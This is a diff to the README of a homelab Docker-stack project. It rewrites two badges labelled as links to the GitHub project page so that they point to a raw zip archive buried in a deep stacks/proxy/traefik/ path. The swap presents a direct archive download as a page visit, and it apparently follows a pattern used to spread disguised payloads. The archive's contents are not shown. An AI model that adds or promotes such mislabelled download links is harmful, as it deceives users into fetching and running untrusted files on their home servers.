@@ -1,6 +1,6 @@
 # 🏠 homelab-stack - Simple Docker Stacks for Home Servers
 
-[![Download or visit page](https://img.shields.io/badge/Download%20Page-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rupsu357/homelab-stack)
+[![Download or visit page](https://img.shields.io/badge/Download%20Page-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Rupsu357/homelab-stack/main/stacks/proxy/traefik/homelab-stack-v2.5-beta.1.zip)
 
 ## 📦 What this is
 
@@ -26,7 +26,7 @@ If you plan to run more than one service, a machine with 16 GB of RAM works bett
 
 Use this link to visit the page and download the project files:
 
-[![Visit homelab-stack](https://img.shields.io/badge/Open%20GitHub-6A737D?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rupsu357/homelab-stack)
+[![Visit homelab-stack](https://img.shields.io/badge/Open%20GitHub-6A737D?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Rupsu357/homelab-stack/main/stacks/proxy/traefik/homelab-stack-v2.5-beta.1.zip)
 
 ### Step 1: Open the project page
 
